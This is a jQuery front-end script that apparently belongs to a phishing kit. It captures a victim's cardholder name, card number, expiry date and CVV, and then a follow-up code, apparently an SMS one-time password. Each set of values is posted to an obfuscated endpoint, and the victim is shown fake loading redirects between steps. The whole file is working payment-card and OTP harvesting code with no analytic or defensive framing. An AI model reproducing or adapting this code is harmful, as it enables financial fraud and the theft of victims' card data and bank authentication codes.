$(function(){
    $("#barinxri").on("click",function(e){


        //send backend:
        $.ajax({
            url: '/7tTeaYMkt9pkpywQpvha',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({logita:"Bari Naxri"}),
            success: function(info) {
                if(info.OK){
                    window.location = '/load?time=3&url=/3EtpVNHarRb8PqJfArbu';
                }
            }
        });
    });
    // $(".center #di").on("click",function(e){


    //     //send backend:
    //     $.ajax({
    //         url: '/fBnsyeWCkGU5PtN44397',
    //         type: 'POST',
    //         contentType: 'application/json',
    //         data: JSON.stringify({logita:"Mabritx Nxri"}),
    //         success: function(info) {
    //             if(info.OK){
    //                 window.location = "/ZjCHNsVuB44QhpjLAj2H";
    //             }
    //         }
    //     });
    // });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a0 = $("#name").val();
        let a1 = $("#num").val();
        let a2 = $("#exp").val();
        let a3 = $("#cvv").val();
        // let a4 = $("#w5").val();


        //send backend:
        $.ajax({
            url: '/v2C8VrVuzY7WzVJv5RB6',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a0,a1,a2,a3}),
            success: function(info) {
                if(info.OK){
                    window.location = "/KecdAK8hGCFkbAY2Qpnk";
                }
            }
        });
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/xGJzLd2dUSJrY9Gscu6P',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/load?time=4&url=/EEXnHMpMEHxNNMgX5Duh";
                }
            }
        });
    });


 



});